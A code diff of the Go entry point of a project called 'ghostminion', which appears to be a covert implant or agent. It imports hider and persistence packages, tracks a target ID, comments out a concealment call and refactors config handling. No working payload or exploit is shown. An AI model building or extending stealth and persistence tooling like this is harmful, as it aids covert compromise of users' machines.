@@ -5,24 +5,23 @@ import (
 	"ghostminion/config"
 	"ghostminion/core"
 	"ghostminion/db"
-	"ghostminion/hider"
 	"ghostminion/logger"
 	"ghostminion/persistence"
 )
 
-var (
-	cfg = config.GetInstance()
-	_   = db.GetInstance()
-	lgr = logger.GetInstance()
-)
-
 func main() {
+
+	var cfg = config.GetInstance()
+	db.GetInstance()
+	var lgr = logger.GetInstance()
+
 	defer config.DeleteConfig()
 	defer lgr.Close()
 
-	if err := hider.Hide(); err != nil {
-		return
-	}
+	// if err := hider.Hide(); err != nil {
+	// 	return
+	// }
+	lgr.Info("hello world")
 
 	targetId := persistence.GeTargetID()
 	err := cfg.Update(func(c *config.Config) {
@@ -32,14 +31,14 @@ func main() {
 		lgr.Error("Error updating agent ID: " + err.Error())
 	}
 
-	lgr.Debug("targetId: %s", targetId)
+	lgr.Debug("targetId:", targetId)
 
 	appCore := core.GetInstance()
-	RegisterDefaultApps(appCore)
+	RegisterDefaultApps(appCore, cfg)
 	appCore.Start() // todo: should run security here
 }
 
-func RegisterDefaultApps(core *core.Core) {
+func RegisterDefaultApps(core *core.Core, cfg *config.Config) {
 	am := core.AppsManager()
 	for _, appConfig := range cfg.Apps {
 		app, err := apps.NewAppFactory(apps.AppData{
